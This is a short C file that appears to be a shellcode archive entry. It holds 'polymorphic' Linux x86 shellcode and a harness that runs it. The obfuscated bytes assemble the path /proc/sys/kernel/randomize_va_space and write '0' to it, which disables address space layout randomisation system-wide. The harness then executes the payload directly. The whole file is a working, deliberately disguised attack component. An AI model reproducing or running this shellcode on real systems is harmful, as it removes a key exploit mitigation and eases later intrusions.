/*
 * Author: John Stigerwalt
 * Polymorphic Shellcode: ALSR Disable
 * 
*/


#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\x51\xbe\x20\x20\x20\x20\xbf\x50\x41\x43\x45\x01\xf7\x57\xbf\x56\x41\x3f\x53\x01\xf7\x57\xbf\x49\x5a\x45\x3f\x01\xf7\x57\xbf\x4e\x44\x4f\x4d\x01\xf7\x57\xbf\x4c\x0f\x52\x41\x01\xf7\x57\xbf\x45\x52\x4e\x45\x01\xf7\x57\xbf\x59\x53\x0f\x4b\x01\xf7\x57\xbf\x4f\x43\x0f\x53\x01\xf7\x57\x68\x2f\x2f\x70\x72\x89\xe3\x91\x66\xb9\xbc\x02\xb0\x08\xcd\x80\x89\xc3\x50\x66\xba\x30\x3a\x66\x52\x89\xe1\x31\xd2\x42\xb0\x04\xcd\x80\xb0\x06\xcd\x80\x40\xcd\x80";


main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}